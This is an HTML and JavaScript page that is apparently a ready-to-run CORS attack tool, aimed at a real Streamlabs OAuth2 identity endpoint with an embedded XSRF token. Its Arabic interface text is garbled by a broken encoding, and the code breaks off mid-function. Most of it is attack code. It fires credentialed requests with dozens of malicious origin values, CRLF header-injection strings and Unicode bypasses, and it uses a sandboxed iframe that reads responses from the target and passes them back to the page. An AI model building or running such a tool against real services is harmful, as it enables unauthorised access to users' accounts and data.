<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced CORS Vulnerability Testing Tool</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Consolas', 'Monaco', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
            background: rgba(20, 20, 20, 0.95);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 40px rgba(0, 255, 0, 0.3);
            border: 2px solid #00ff00;
        }
        
        h1 {
            text-align: center;
            color: #00ff00;
            text-shadow: 0 0 20px #00ff00;
            margin-bottom: 30px;
            font-size: 2.5em;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { text-shadow: 0 0 20px #00ff00; }
            50% { text-shadow: 0 0 40px #00ff00, 0 0 60px #00ff00; }
            100% { text-shadow: 0 0 20px #00ff00; }
        }
        
        .section {
            background: rgba(10, 10, 10, 0.8);
            padding: 20px;
            margin: 20px 0;
            border-radius: 10px;
            border: 1px solid #00ff00;
        }
        
        .section h2 {
            color: #00ff00;
            margin-bottom: 15px;
            font-size: 1.5em;
        }
        
        input, textarea, select {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            border-radius: 5px;
            font-family: inherit;
            font-size: 14px;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            box-shadow: 0 0 10px #00ff00;
        }
        
        .button-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        
        button {
            background: linear-gradient(45deg, #00ff00, #00cc00);
            color: #000;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 14px;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 255, 0, 0.5);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .results {
            background: #000;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #00ff00;
            max-height: 600px;
            overflow-y: auto;
            font-size: 13px;
            line-height: 1.6;
        }
        
        .results::-webkit-scrollbar {
            width: 10px;
        }
        
        .results::-webkit-scrollbar-track {
            background: #111;
        }
        
        .results::-webkit-scrollbar-thumb {
            background: #00ff00;
            border-radius: 5px;
        }
        
        .log-entry {
            margin: 5px 0;
            padding: 8px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }
        
        .success { 
            color: #00ff00; 
            background: rgba(0, 255, 0, 0.1);
        }
        
        .error { 
            color: #ff0000; 
            background: rgba(255, 0, 0, 0.1);
        }
        
        .warning { 
            color: #ffff00; 
            background: rgba(255, 255, 0, 0.1);
        }
        
        .info { 
            color: #00ffff; 
            background: rgba(0, 255, 255, 0.1);
        }
        
        .vulnerable { 
            color: #ff00ff; 
            background: rgba(255, 0, 255, 0.1);
            font-weight: bold;
            font-size: 16px;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.5; }
        }
        
        pre {
            background: #000;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 5px 0;
            border: 1px solid #333;
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #111;
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
            border: 1px solid #00ff00;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff00, #00cc00);
            width: 0%;
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #000;
            font-weight: bold;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        
        .stat-card {
            background: rgba(0, 255, 0, 0.1);
            padding: 15px;
            border-radius: 5px;
            text-align: center;
            border: 1px solid #00ff00;
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #00ff00;
        }
        
        .stat-label {
            font-size: 0.9em;
            color: #00cc00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ›¡ï¸ Advanced CORS Vulnerability Testing Tool ğŸ›¡ï¸</h1>
        
        <div class="section">
            <h2>âš™ï¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù‡Ø¯Ù</h2>
            <label>Target URL:</label>
            <input type="text" id="targetUrl" value="https://api-id.streamlabs.com/v1/identity/clients/412568508887465984/oauth2" />
            
            <label>HTTP Method:</label>
            <select id="method">
                <option value="POST">POST</option>
                <option value="GET">GET</option>
                <option value="PUT">PUT</option>
                <option value="DELETE">DELETE</option>
                <option value="PATCH">PATCH</option>
                <option value="OPTIONS">OPTIONS</option>
                <option value="HEAD">HEAD</option>
            </select>
            
            <label>Request Body (JSON):</label>
            <textarea id="requestBody" rows="4">{"origin":"https://videoeditor.streamlabs.com","intent":"connect","noAuthTarget":"login"}</textarea>
            
            <label>Custom Headers (JSON):</label>
            <textarea id="customHeaders" rows="8">{
  "X-Xsrf-Token": "eyJpdiI6IjE4K0tMZGZ4UHV0aWdsaVJXMC9RRGc9PSIsInZhbHVlIjoiWmoxcEc4OVM0WDBlcGR2VmhVVFFBZG5KUTdIUy8zS0xGcVpkYW1DYWNTdkZtelRESU9hSmNGU2FXbTBSY1UxNCIsIm1hYyI6IjNkNjM4ZjViZTU2MGEzNGE4NjJjZjUyYzhkY2RmNjM3ODBlNzc3OTZlMDMwZTQwZmY2NGYxMGFmNzZmYTM1ZDciLCJ0YWciOiIifQ==",
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*"
}</textarea>
            
            <label>Test Delay (ms):</label>
            <input type="number" id="delay" value="100" min="0" max="5000" />
        </div>

        <div class="section">
            <h2>ğŸ¯ Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª CORS Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©</h2>
            <div class="button-grid">
                <button onclick="runAllTests()">ğŸš€ ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª</button>
                <button onclick="testBasicCORS()">ğŸ“‹ Ø§Ø®ØªØ¨Ø§Ø± CORS Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ</button>
                <button onclick="testOriginManipulation()">ğŸŒ ØªÙ„Ø§Ø¹Ø¨ Origin</button>
                <button onclick="testSubdomainAttacks()">ğŸ”— Ù‡Ø¬Ù…Ø§Øª Subdomain</button>
                <button onclick="testNullOrigin()">ğŸš« Null Origin</button>
                <button onclick="testCredentialsInclude()">ğŸ” Credentials Testing</button>
                <button onclick="testPreflightBypass()">âœˆï¸ Preflight Bypass</button>
                <button onclick="testHeaderInjection()">ğŸ’‰ Header Injection</button>
                <button onclick="testProtocolDowngrade()">ğŸ”“ Protocol Downgrade</button>
                <button onclick="testWildcardBypass()">ğŸƒ Wildcard Bypass</button>
                <button onclick="testWebSocketCORS()">ğŸ”Œ WebSocket CORS</button>
                <button onclick="testSpecialCharacters()">ğŸ”¤ Special Characters</button>
                <button onclick="testRegexBypass()">ğŸ­ Regex Bypass</button>
                <button onclick="testPortVariations()">ğŸ”¢ Port Variations</button>
                <button onclick="testEncodingBypass()">ğŸ” Encoding Bypass</button>
                <button onclick="testChainedAttacks()">â›“ï¸ Chained Attacks</button>
                <button onclick="clearResults()">ğŸ—‘ï¸ Ù…Ø³Ø­ Ø§Ù„Ù†ØªØ§Ø¦Ø¬</button>
                <button onclick="exportResults()">ğŸ“¥ ØªØµØ¯ÙŠØ± Ø§Ù„Ù†ØªØ§Ø¦Ø¬</button>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="totalTests">0</div>
                <div class="stat-label">Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="vulnerableCount">0</div>
                <div class="stat-label">Ø«ØºØ±Ø§Øª Ù…ÙƒØªØ´ÙØ©</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="successCount">0</div>
                <div class="stat-label">Ù†Ø¬Ø­</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="failedCount">0</div>
                <div class="stat-label">ÙØ´Ù„</div>
            </div>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressBar">0%</div>
        </div>

        <div class="results" id="results">
            <div class="log-entry info">ğŸš€ Ø¬Ø§Ù‡Ø² Ù„Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Ø«ØºØ±Ø§Øª CORS...</div>
        </div>
    </div>

    <script>
        let testResults = [];
        let stats = {
            total: 0,
            vulnerable: 0,
            success: 0,
            failed: 0
        };
        
        function updateStats() {
            document.getElementById('totalTests').textContent = stats.total;
            document.getElementById('vulnerableCount').textContent = stats.vulnerable;
            document.getElementById('successCount').textContent = stats.success;
            document.getElementById('failedCount').textContent = stats.failed;
        }
        
        function updateProgress(current, total) {
            const percentage = total > 0 ? Math.round((current / total) * 100) : 0;
            const progressBar = document.getElementById('progressBar');
            progressBar.style.width = percentage + '%';
            progressBar.textContent = percentage + '%';
        }
        
        function log(message, type = 'info', details = null) {
            const timestamp = new Date().toLocaleTimeString();
            const results = document.getElementById('results');
            
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.innerHTML = `[${timestamp}] ${message}`;
            
            if (details) {
                const pre = document.createElement('pre');
                pre.textContent = typeof details === 'string' ? details : JSON.stringify(details, null, 2);
                entry.appendChild(pre);
            }
            
            results.appendChild(entry);
            results.scrollTop = results.scrollHeight;
            
            testResults.push({ timestamp, message, type, details });
            
            if (type === 'vulnerable') stats.vulnerable++;
            else if (type === 'success') stats.success++;
            else if (type === 'error') stats.failed++;
            
            updateStats();
        }
        
        function clearResults() {
            document.getElementById('results').innerHTML = '<div class="log-entry info">ğŸš€ Ø¬Ø§Ù‡Ø² Ù„Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Ø«ØºØ±Ø§Øª CORS...</div>';
            testResults = [];
            stats = { total: 0, vulnerable: 0, success: 0, failed: 0 };
            updateStats();
            updateProgress(0, 0);
        }
        
        function exportResults() {
            const data = {
                timestamp: new Date().toISOString(),
                targetUrl: document.getElementById('targetUrl').value,
                stats: stats,
                results: testResults
            };
            
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cors-test-results-${Date.now()}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }
        
        async function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        async function makeRequest(url, options = {}) {
            const delayMs = parseInt(document.getElementById('delay').value) || 100;
            await delay(delayMs);
            
            try {
                const response = await fetch(url, options);
                const responseData = {
                    status: response.status,
                    statusText: response.statusText,
                    headers: {}
                };
                
                // Ø¬Ù…Ø¹ headers Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©
                const importantHeaders = [
                    'access-control-allow-origin',
                    'access-control-allow-credentials',
                    'access-control-allow-methods',
                    'access-control-allow-headers',
                    'access-control-expose-headers',
                    'access-control-max-age',
                    'vary',
                    'x-frame-options',
                    'content-security-policy',
                    'x-content-type-options'
                ];
                
                for (let header of importantHeaders) {
                    const value = response.headers.get(header);
                    if (value) responseData.headers[header] = value;
                }
                
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø¬Ø³Ù…
                try {
                    const contentType = response.headers.get('content-type');
                    if (contentType && contentType.includes('application/json')) {
                        responseData.body = await response.json();
                    } else {
                        responseData.body = await response.text();
                    }
                } catch (e) {
                    responseData.body = 'Could not read response body';
                }
                
                return { success: true, response: responseData };
            } catch (error) {
                return { success: false, error: error.message };
            }
        }
        
        async function testBasicCORS() {
            log('ğŸ” Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± CORS Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ...', 'info');
            stats.total++;
            
            const url = document.getElementById('targetUrl').value;
            const method = document.getElementById('method').value;
            const body = document.getElementById('requestBody').value;
            const headers = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const options = {
                method: method,
                headers: headers,
                mode: 'cors',
                credentials: 'include'
            };
            
            if (method !== 'GET' && method !== 'HEAD') {
                options.body = body;
            }
            
            const result = await makeRequest(url, options);
            
            if (result.success) {
                const corsHeaders = result.response.headers;
                log('âœ… Ø§Ù„Ø§ØªØµØ§Ù„ Ù†Ø¬Ø­', 'success', corsHeaders);
                
                // ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø«ØºØ±Ø§Øª
                if (corsHeaders['access-control-allow-origin'] === '*') {
                    log('ğŸš¨ Ø«ØºØ±Ø© CORS Ø®Ø·ÙŠØ±Ø©: Ø§Ù„Ø®Ø§Ø¯Ù… ÙŠÙ‚Ø¨Ù„ Ø£ÙŠ origin (*)', 'vulnerable');
                }
                
                if (corsHeaders['access-control-allow-credentials'] === 'true') {
                    if (corsHeaders['access-control-allow-origin'] === '*') {
                        log('ğŸš¨ Ø«ØºØ±Ø© CORS Ø­Ø±Ø¬Ø©: wildcard Ù…Ø¹ credentials!', 'vulnerable');
                    } else {
                        log('âš ï¸ Ø§Ù„Ø®Ø§Ø¯Ù… ÙŠØ³Ù…Ø­ Ø¨Ø¥Ø±Ø³Ø§Ù„ credentials', 'warning');
                    }
                }
            } else {
                log(`âŒ ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„: ${result.error}`, 'error');
            }
        }
        
        async function testOriginManipulation() {
            log('ğŸŒ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªÙ„Ø§Ø¹Ø¨ Ø¨Ù€ Origin...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const method = document.getElementById('method').value;
            const body = document.getElementById('requestBody').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const maliciousOrigins = [
                'https://evil.com',
                'http://evil.com',
                'https://evil-streamlabs.com',
                'https://streamlabs.evil.com',
                'https://streamlabs.com.evil.com',
                'https://streamlabsXcom',
                'https://streamlabs.com@evil.com',
                'https://evil.com#@streamlabs.com',
                'https://streamlabs.com%60.evil.com',
                'https://streamlabs.com\\.evil.com',
                'https://streamlabs.com*.evil.com',
                'https://streamlabs.com!.evil.com',
                'https://streamlabs.com$.evil.com',
                'https://streamlabs.com&.evil.com',
                'https://streamlabs.com\'.evil.com',
                'https://streamlabs.com+.evil.com',
                'https://streamlabs.com,.evil.com',
                'https://streamlabs.com;.evil.com',
                'https://streamlabs.com=.evil.com',
                'https://streamlabs.com%00.evil.com',
                'https://streamlabs.com%0d%0a.evil.com',
                'https://streamlabs.com%20.evil.com',
                'https://streamlabs.com%2e.evil.com',
                'http://localhost',
                'http://127.0.0.1',
                'http://0.0.0.0',
                'http://[::1]',
                'file:///',
                'null',
                'undefined',
                'chrome-extension://evil',
                'moz-extension://evil'
            ];
            
            const total = maliciousOrigins.length;
            let current = 0;
            
            for (const origin of maliciousOrigins) {
                current++;
                updateProgress(current, total);
                stats.total++;
                
                const headers = { ...baseHeaders, 'Origin': origin };
                const options = {
                    method: method,
                    headers: headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (method !== 'GET' && method !== 'HEAD') {
                    options.body = body;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    const allowCredentials = result.response.headers['access-control-allow-credentials'];
                    
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`ğŸš¨ Ø«ØºØ±Ø© CORS: Ø§Ù„Ø®Ø§Ø¯Ù… ÙŠÙ‚Ø¨Ù„ Origin Ø§Ù„Ø®Ø¨ÙŠØ«: ${origin}`, 'vulnerable', {
                            'sent-origin': origin,
                            'allowed-origin': allowOrigin,
                            'allow-credentials': allowCredentials,
                            'response-status': result.response.status
                        });
                    } else if (allowOrigin) {
                        log(`âœ… Ø¢Ù…Ù†: Ø§Ù„Ø®Ø§Ø¯Ù… Ø±ÙØ¶ Origin: ${origin}`, 'success');
                    }
                }
            }
        }
        
        async function testSubdomainAttacks() {
            log('ğŸ”— Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Ù‡Ø¬Ù…Ø§Øª Subdomain...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¯ÙˆÙ…ÙŠÙ† Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ
            const urlObj = new URL(url);
            const domain = urlObj.hostname.split('.').slice(-2).join('.');
            
            const subdomainVariations = [
                `https://evil.${domain}`,
                `https://evil-${domain}`,
                `https://${domain}.evil.com`,
                `https://sub.${domain}`,
                `https://test.${domain}`,
                `https://dev.${domain}`,
                `https://staging.${domain}`,
                `https://api.${domain}`,
                `https://admin.${domain}`,
                `https://www.${domain}`,
                `https://mobile.${domain}`,
                `https://app.${domain}`,
                `https://*.${domain}`,
                `https://?.${domain}`,
                `https://_.${domain}`,
                `https://-.${domain}`,
                `https://a.b.${domain}`,
                `https://very.long.subdomain.chain.${domain}`
            ];
            
            for (const origin of subdomainVariations) {
                stats.total++;
                const headers = { ...baseHeaders, 'Origin': origin };
                const options = {
                    method: document.getElementById('method').value,
                    headers: headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (options.method !== 'GET' && options.method !== 'HEAD') {
                    options.body = document.getElementById('requestBody').value;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`ğŸš¨ Ø«ØºØ±Ø© Subdomain: ${origin} Ù…Ø³Ù…ÙˆØ­!`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testNullOrigin() {
            log('ğŸš« Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Null Origin...', 'info');
            stats.total++;
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            // Ø·Ø±Ù‚ Ù…Ø®ØªÙ„ÙØ© Ù„Ø¥Ø±Ø³Ø§Ù„ null origin
            const nullOriginTests = [
                { origin: 'null', description: 'Direct null string' },
                { origin: null, description: 'JavaScript null value' },
                { origin: '', description: 'Empty string' },
                { origin: ' ', description: 'Space character' },
                { origin: '\x00', description: 'Null byte' },
                { origin: 'data:', description: 'Data URI' },
                { origin: 'blob:', description: 'Blob URI' },
                { origin: 'file:', description: 'File protocol' }
            ];
            
            for (const test of nullOriginTests) {
                const headers = { ...baseHeaders };
                if (test.origin !== null) {
                    headers['Origin'] = test.origin;
                }
                
                const options = {
                    method: document.getElementById('method').value,
                    headers: headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (options.method !== 'GET' && options.method !== 'HEAD') {
                    options.body = document.getElementById('requestBody').value;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === 'null' || allowOrigin === test.origin || allowOrigin === '*') {
                        log(`ğŸš¨ Ø«ØºØ±Ø© Null Origin: ${test.description}`, 'vulnerable', {
                            'test': test,
                            'response-headers': result.response.headers
                        });
                    }
                }
            }
            
            // Ø§Ø®ØªØ¨Ø§Ø± iframe sandboxed
            log('ğŸ” Ø§Ø®ØªØ¨Ø§Ø± Sandboxed iframe null origin...', 'info');
            const iframe = document.createElement('iframe');
            iframe.sandbox = 'allow-scripts';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            iframe.contentDocument.write(\`
                <script>
                    fetch('${url}', {
                        method: '${document.getElementById('method').value}',
                        headers: ${JSON.stringify(baseHeaders)},
                        credentials: 'include'
                    }).then(r => r.text()).then(data => {
                        parent.postMessage({
                            type: 'cors-test',
                            success: true,
                            data: data
                        }, '*');
                    }).catch(err => {
                        parent.postMessage({
                            type: 'cors-test',
                            success: false,
                            error: err.message
                        }, '*');
                    });
                <\/script>
            \`);
            
            window.addEventListener('message', function(e) {
                if (e.data.type === 'cors-test') {
                    if (e.data.success) {
                        log('ğŸš¨ Ø«ØºØ±Ø©: Sandboxed iframe ÙŠÙ…ÙƒÙ†Ù‡ Ø§Ù„ÙˆØµÙˆÙ„!', 'vulnerable', e.data);
                    }
                    document.body.removeChild(iframe);
                }
            });
        }
        
        async function testCredentialsInclude() {
            log('ğŸ” Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Credentials...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const credentialTests = [
                { credentials: 'include', origin: 'https://evil.com' },
                { credentials: 'same-origin', origin: 'https://evil.com' },
                { credentials: 'omit', origin: 'https://evil.com' },
                { credentials: 'include', origin: '*' },
                { credentials: 'include', origin: 'null' }
            ];
            
            for (const test of credentialTests) {
                stats.total++;
                const headers = { ...baseHeaders, 'Origin': test.origin };
                const options = {
                    method: document.getElementById('method').value,
                    headers: headers,
                    mode: 'cors',
                    credentials: test.credentials
                };
                
                if (options.method !== 'GET' && options.method !== 'HEAD') {
                    options.body = document.getElementById('requestBody').value;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    const allowCredentials = result.response.headers['access-control-allow-credentials'];
                    
                    if (allowCredentials === 'true' && (allowOrigin === test.origin || allowOrigin === '*')) {
                        log(`ğŸš¨ Ø«ØºØ±Ø© Credentials: ${JSON.stringify(test)}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testPreflightBypass() {
            log('âœˆï¸ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± ØªØ¬Ø§ÙˆØ² Preflight...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            
            // Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ø¨Ø³ÙŠØ·Ø© Ø§Ù„ØªÙŠ Ù„Ø§ ØªØ­ØªØ§Ø¬ preflight
            const simpleRequests = [
                {
                    method: 'GET',
                    headers: { 'Origin': 'https://evil.com' }
                },
                {
                    method: 'POST',
                    headers: {
                        'Origin': 'https://evil.com',
                        'Content-Type': 'text/plain'
                    }
                },
                {
                    method: 'POST',
                    headers: {
                        'Origin': 'https://evil.com',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                },
                {
                    method: 'POST',
                    headers: {
                        'Origin': 'https://evil.com',
                        'Content-Type': 'multipart/form-data'
                    }
                }
            ];
            
            for (const request of simpleRequests) {
                stats.total++;
                const options = {
                    method: request.method,
                    headers: request.headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (request.method === 'POST') {
                    options.body = 'test=data';
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    log(`âš ï¸ Ø·Ù„Ø¨ Ø¨Ø³ÙŠØ· Ø¨Ø¯ÙˆÙ† preflight: ${JSON.stringify(request)}`, 'warning', result.response.headers);
                }
            }
        }
        
        async function testHeaderInjection() {
            log('ğŸ’‰ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Header Injection...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const injectionTests = [
                'https://evil.com\r\nX-Injected: true',
                'https://evil.com\nX-Injected: true',
                'https://evil.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com',
                'https://evil.com%0d%0aX-Injected:%20true',
                'https://evil.com%0aX-Injected:%20true',
                'https://evil.com\u000dX-Injected: true',
                'https://evil.com\u000aX-Injected: true',
                'https://evil.com\u0085X-Injected: true',
                'https://evil.com\u2028X-Injected: true',
                'https://evil.com\u2029X-Injected: true'
            ];
            
            for (const injection of injectionTests) {
                stats.total++;
                const headers = { ...baseHeaders, 'Origin': injection };
                
                try {
                    const options = {
                        method: document.getElementById('method').value,
                        headers: headers,
                        mode: 'cors',
                        credentials: 'include'
                    };
                    
                    if (options.method !== 'GET' && options.method !== 'HEAD') {
                        options.body = document.getElementById('requestBody').value;
                    }
                    
                    const result = await makeRequest(url, options);
                    
                    if (result.success) {
                        log(`âš ï¸ Header injection Ù…Ø­ØªÙ…Ù„: ${injection}`, 'warning', result.response.headers);
                    }
                } catch (e) {
                    log(`âœ… Header injection Ù…Ø­Ù…ÙŠ: ${injection}`, 'success');
                }
            }
        }
        
        async function testProtocolDowngrade() {
            log('ğŸ”“ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Protocol Downgrade...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            
            const protocols = [
                `http://${urlObj.host}${urlObj.pathname}`,
                `ws://${urlObj.host}${urlObj.pathname}`,
                `wss://${urlObj.host}${urlObj.pathname}`,
                `ftp://${urlObj.host}${urlObj.pathname}`
            ];
            
            for (const protocolUrl of protocols) {
                stats.total++;
                try {
                    const result = await makeRequest(protocolUrl, {
                        method: document.getElementById('method').value,
                        headers: JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        mode: 'cors',
                        credentials: 'include'
                    });
                    
                    if (result.success) {
                        log(`ğŸš¨ Protocol downgrade Ù…Ù…ÙƒÙ†: ${protocolUrl}`, 'vulnerable', result.response.headers);
                    }
                } catch (e) {
                    log(`âœ… Protocol downgrade Ù…Ø­Ù…ÙŠ: ${protocolUrl}`, 'info');
                }
            }
        }
        
        async function testWildcardBypass() {
            log('ğŸƒ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Wildcard Bypass...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            const wildcardTests = [
                { origin: '*', desc: 'Direct wildcard' },
                { origin: '*.evil.com', desc: 'Wildcard subdomain' },
                { origin: 'https://*', desc: 'Wildcard with protocol' },
                { origin: '*://evil.com', desc: 'Wildcard protocol' },
                { origin: 'https://?.evil.com', desc: 'Question mark wildcard' },
                { origin: 'https://%.evil.com', desc: 'Percent wildcard' },
                { origin: 'https://_.evil.com', desc: 'Underscore wildcard' }
            ];
            
            for (const test of wildcardTests) {
                stats.total++;
                const headers = { ...baseHeaders, 'Origin': test.origin };
                const options = {
                    method: document.getElementById('method').value,
                    headers: headers,
                    mode: 'cors',
                    credentials: 'include'
                };
                
                if (options.method !== 'GET' && options.method !== 'HEAD') {
                    options.body = document.getElementById('requestBody').value;
                }
                
                const result = await makeRequest(url, options);
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin && (allowOrigin.includes('*') || allowOrigin === test.origin)) {
                        log(`ğŸš¨ Wildcard bypass: ${test.desc}`, 'vulnerable', {
                            'test': test,
                            'response': result.response.headers
                        });
                    }
                }
            }
        }
        
        async function testWebSocketCORS() {
            log('ğŸ”Œ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± WebSocket CORS...', 'info');
            stats.total++;
            
            const url = document.getElementById('targetUrl').value;
            const wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
            
            try {
                const ws = new WebSocket(wsUrl);
                
                ws.onopen = () => {
                    log('ğŸš¨ WebSocket connection opened - Ù‚Ø¯ ØªÙƒÙˆÙ† Ù‡Ù†Ø§Ùƒ Ø«ØºØ±Ø© CORS!', 'vulnerable');
                    ws.send(JSON.stringify({
                        type: 'test',
                        payload: 'CORS test'
                    }));
                };
                
                ws.onmessage = (event) => {
                    log('ğŸ“¨ WebSocket message received', 'warning', event.data);
                };
                
                ws.onerror = (error) => {
                    log('âœ… WebSocket connection blocked', 'success');
                };
                
                setTimeout(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.close();
                    }
                }, 5000);
                
            } catch (e) {
                log('âœ… WebSocket connection failed - Ù…Ø­Ù…ÙŠ', 'success');
            }
        }
        
        async function testSpecialCharacters() {
            log('ğŸ”¤ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Special Characters...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            const domain = urlObj.hostname;
            
            const specialChars = [
                `https://${domain}ï½¡evil.com`,
                `https://${domain}ã€‚evil.com`,
                `https://${domain}ï¼evil.com`,
                `https://${domain}ï½€evil.com`,
                `https://${domain}Ê³evil.com`,
                `https://${domain}Âªevil.com`,
                `https://${domain}Âºevil.com`,
                `https://${domain}Ëševil.com`,
                `https://${domain}â°evil.com`,
                `https://${domain}â‚€evil.com`,
                `https://${domain}\u3002evil.com`,
                `https://${domain}\uff0eevil.com`,
                `https://${domain}\uff61evil.com`,
                `https://${domain}%E3%80%82evil.com`,
                `https://${domain}ã€‚evil.com`,
                `https://${domain}ï½¡evil.com`,
                `https://${domain}ã€‚evilã€‚com`,
                `https://${domain}\u2024evil.com`,
                `https://${domain}\u2025evil.com`,
                `https://${domain}\u2026evil.com`
            ];
            
            for (const origin of specialChars) {
                stats.total++;
                const result = await makeRequest(url, {
